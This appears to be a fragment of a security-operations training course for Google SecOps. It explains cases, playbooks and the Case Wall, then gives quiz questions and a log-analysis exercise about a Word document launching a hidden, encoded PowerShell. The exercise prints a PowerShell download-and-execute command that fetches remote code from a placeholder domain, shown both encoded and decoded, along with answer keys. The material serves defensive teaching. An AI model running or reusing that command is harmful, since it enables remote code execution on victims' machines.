        "content": "**From alert to case.** When a detection alerts, the alert reaches the SOAR side of Google SecOps. SOAR parses its events and key indicators. Indicators such as IPs, file hashes and user accounts become entities: persistent objects that keep enrichment data, analyst comments and history. Alerts are grouped into cases based on shared entities and configurable rules, so three alerts about one laptop arrive as one case rather than three tickets. Analysts can also create cases by hand, or simulate them for training.\n\n### Reading a case\n\n| Where | What you do there |\n|---|---|\n| Case Overview tab | See pending actions that need your input, the case description, the grouped alerts with their names, event counts and priority, and recent activity |\n| Alerts and events | Read the raw evidence behind each alert |\n| Entities | See every host, user, IP and hash, with enrichment |\n| Case Wall | The chronological log from creation to closure: tasks, comments, manual and system actions, attachments. Write what you found and did here |\n\n### Playbooks\n\nA playbook has a trigger (the mandatory start condition), actions (enrich data, notify people, isolate a host) and flows (if-then-else branches). Only one playbook attaches automatically to an alert, chosen by priority. The Playbook Simulator lets you test without touching real systems.\n\nPlaybooks work at two scopes. An alert playbook runs its actions separately for each alert. A case playbook runs across the whole case: one action serves the entire case, only alerts with an Open status are processed, and entities from all alerts are merged into one list with duplicates removed by default, so enrichment is done once per entity.\n\n### The analyst's order of work\n\n1. Read the overview: which alerts are grouped, and which entity do they share?\n2. Enrich the entities. Prevalence and intelligence tell you what is rare and what is known.\n3. Verify against the evidence and, where an action could disrupt people, against the owner (IT, the user, a change ticket).\n4. Contain only when you are confident, and ask for approval where the playbook requires it.\n5. Document findings and actions on the Case Wall.\n6. Close the case. In the Close Case dialog you pick a reason first (Malicious, Not malicious, Maintenance or Inconclusive) and then a root cause. Comments you add are posted to the Case Wall.\n\n### Why verification matters\n\nAutomation is fast and literal. A playbook that isolates a host stops a beacon, and it also stops a finance laptop from submitting payments. The verification step is where the analyst's judgement sits, so do not let it become a click.\n\n### What an analyst asks\n\nWhich alerts in this case are the same story, and which only share an entity by coincidence? What has already run on the Case Wall? What would I regret doing without asking the owner?",
        "codeExample": "Case 6120  (illustrative layout)\nOverview : 5 alerts grouped on kf-lt-0319 | priority High\nCase Wall:\n  09:58  Playbook \"Enrich entities\"        Completed\n  10:03  Analyst comment                   Domain prevalence is 3 assets, all Finance\n  10:06  Playbook \"Isolate host\"           Pending approval\n  10:20  Analyst closes alert 5            Reason: Maintenance",
        "checkpoint": {
          "question": "In the Close Case dialog, what must you choose before you can pick a root cause?",
          "options": [
            "A closure reason, such as Malicious, Not malicious, Maintenance or Inconclusive",
            "An assignee, because the root cause list depends on who owns the case",
            "A playbook, because a root cause is recorded by the last playbook that ran",
            "A tag name, because root causes are filtered by the tags on the case"
          ],
          "answer": 0,
          "explanation": "The root cause menu unlocks only after you select a reason, and each root cause is tied to a reason. Assignee, playbook and tag do not determine the list. Your comments in the dialog are posted to the Case Wall."
        }
      },
      {
        "type": "log_analysis",
        "id": "gso-la1",
        "heading": "Investigate: A Document Opens, PowerShell Starts",
        "context": "Case 6130 at Kestrel Freight. Customer service agent l.okoye reported an invoice email at 10:12 and opened its attachment from Downloads. SecOps grouped three alerts on kf-ws-0188 into the case; this is the first. The encoded argument below is base64 of UTF-16LE text. You decoded it and it reads: IEX ((New-Object Net.WebClient).DownloadString('https://kestrel-assets-cdn.example/p'))",
        "event": {
          "id": "evt-gso-la1-001",
          "ts": "2026-11-06T10:14:52.000Z",
          "source": "siem",
          "vendor": "Google SecOps",
          "event_type": "process_create",
          "severity": "high",
          "hostname": "kf-ws-0188",
          "user_title": "Customer Service Agent",
          "user": {
            "full_name": "L. Okoye",
            "email": "l.okoye@kestrelfreight.example",
            "department": "Customer Service"
          },
          "process": {
            "name": "powershell.exe",
            "pid": 7240,
            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_name": "WINWORD.EXE",
            "parent_pid": 4312,
            "cmdline": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAGsAZQBzAHQAcgBlAGwALQBhAHMAcwBlAHQAcwAtAGMAZABuAC4AZQB4AGEAbQBwAGwAZQAvAHAAJwApACkA",
            "user": "KESTREL\\l.okoye",
            "integrity": "medium"
          },
          "description": "UDM PROCESS_LAUNCH event on kf-ws-0188, the first alert in case 6130.",
          "raw": {
            "metadata.event_timestamp": "2026-11-06T10:14:52Z",
            "metadata.event_type": "PROCESS_LAUNCH",
            "metadata.product_event_type": "1",
            "principal.hostname": "kf-ws-0188",
            "principal.asset.hostname": "kf-ws-0188",
            "principal.user.userid": "l.okoye",
            "principal.process.pid": "4312",
            "principal.process.file.full_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "principal.process.command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\l.okoye\\Downloads\\Invoice_KF-88213.docm\"",
            "target.process.pid": "7240",
            "target.process.file.full_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "target.process.file.sha256": "c137d995bd8ecba5c7340fece4e0ff8a12a21671ea8aced325489f28ce634b02",
            "target.process.command_line": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAGsAZQBzAHQAcgBlAGwALQBhAHMAcwBlAHQAcwAtAGMAZABuAC4AZQB4AGEAbQBwAGwAZQAvAHAAJwApACkA"
          }
        },
        "questions": [
          {
            "question": "Which UDM field tells you what started PowerShell here?",
            "options": [
              "principal.process.file.full_path, because principal holds the parent that did the launching",
              "target.process.file.full_path, because target holds the process that started the launch",
              "target.process.command_line, because the encoded argument names the process that spawned it",
              "metadata.product_event_type, because event 1 always records a document application as parent"
            ],
            "answer": 0,
            "explanation": "On a PROCESS_LAUNCH the launched process is in target and its parent is in principal, so principal.process.file.full_path (WINWORD.EXE) is what started PowerShell. target.process.file.full_path is PowerShell itself. The command line holds arguments, not the parent. product_event_type is only the source's event ID (1 for process creation) and says nothing about the parent.",
            "xp": 10
          },
          {
            "question": "What makes this launch high-confidence evidence rather than routine PowerShell use?",
            "options": [
              "A word processor is the parent, and the child is a hidden-window PowerShell running an encoded command",
              "The SHA-256 of powershell.exe is unfamiliar, which proves the system binary was replaced",
              "The user is a standard user rather than an administrator, which PowerShell never allows",
              "PowerShell started at all on a workstation, and it never runs there during normal work"
            ],
            "answer": 0,
            "explanation": "Word spawning a shell is rare in normal work, and the hidden window plus an encoded argument is built to avoid being read, while the Downloads document in the parent's command line explains how it started. A hash cannot prove replacement on its own, and the file path is the normal System32 location. Standard users run PowerShell all the time. PowerShell is routine on many workstations, so its presence alone proves nothing.",
            "xp": 10
          },
          {
            "question": "After decoding, the command downloads from kestrel-assets-cdn.example. What is the best next step in SecOps?",
            "options": [
              "Open the domain view and search UDM for every asset that resolved or contacted the domain, to scope the case",
              "Close the alert, because PowerShell is a signed Microsoft binary and the launch was allowed",
              "Block the domain and close the case at once, without checking whether other assets contacted it",
              "Run a retrohunt of a curated rule set first, because UDM Search cannot look at past events"
            ],
            "answer": 0,
            "explanation": "The domain is the shared entity, so scope the incident: see its prevalence and which other assets resolved or connected to it, then contain and block. A signed binary does not make its use benign. Blocking without scoping leaves infected hosts you have not found, and closing before that is premature. UDM Search can search up to 365 days of stored events, so a retrohunt of a curated rule set is not a prerequisite for looking back.",
            "xp": 15
          }
        ]
      },
      {
        "type": "ordering",
        "id": "gso-o2",
        "heading": "Run the Case: The Playbook Steps in Order",
        "instructions": "Case 6130 is confirmed as a document-launched, encoded PowerShell chain on kf-ws-0188 that contacted kestrel-assets-cdn.example. Put the steps of the case playbook in the order an analyst should run them.",
        "items": [
          {
            "id": "t4",
            "text": "Contain the confirmed host: isolate kf-ws-0188 and revoke l.okoye's sessions, with approval"
          },
          {
            "id": "t6",
            "text": "Write the findings and actions on the Case Wall, then close with a reason and root cause"
          },
          {
            "id": "t2",
            "text": "Enrich the entities: the host, the user, the domain and the file hash"
          },
          {
            "id": "t5",
            "text": "Scope: search UDM for other assets that resolved the domain, then block it"
          },
          {
            "id": "t1",
            "text": "Read the case overview to see which alerts are grouped and what entities they share"
          },
          {
            "id": "t3",
            "text": "Verify against the evidence: Word as parent, the encoded command, the domain match, no change ticket"
          }
        ],
        "correct_order": [
          "t1",
          "t2",
          "t3",
          "t4",
          "t5",
          "t6"
        ],
        "explanation": "Start by understanding the case, then enrich the entities so the evidence is complete, then verify before any disruptive action. Contain the confirmed host first to stop the beacon, then scope outward from the shared domain to find other assets and block it for everyone. Documenting and closing come last, so the Case Wall records what was actually done and the close reason is true.",
        "xp": 15
      }
    ]
  }
];
